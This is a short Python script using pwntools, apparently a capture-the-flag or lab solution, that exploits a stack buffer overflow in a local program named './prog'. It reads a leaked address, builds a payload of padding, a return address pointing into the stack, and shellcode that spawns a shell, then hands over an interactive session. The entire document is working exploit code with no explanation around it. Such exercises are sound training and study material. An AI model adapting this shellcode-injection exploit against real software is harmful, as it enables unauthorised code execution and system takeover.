from pwn import *

p = process('./prog')
context.binary = p.elf

p.readuntil(b'at')
addr = int(p.readline(), 0)

payload = b'A'*(1+context.bytes)
payload += pack(addr + len(payload) + context.bytes)
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
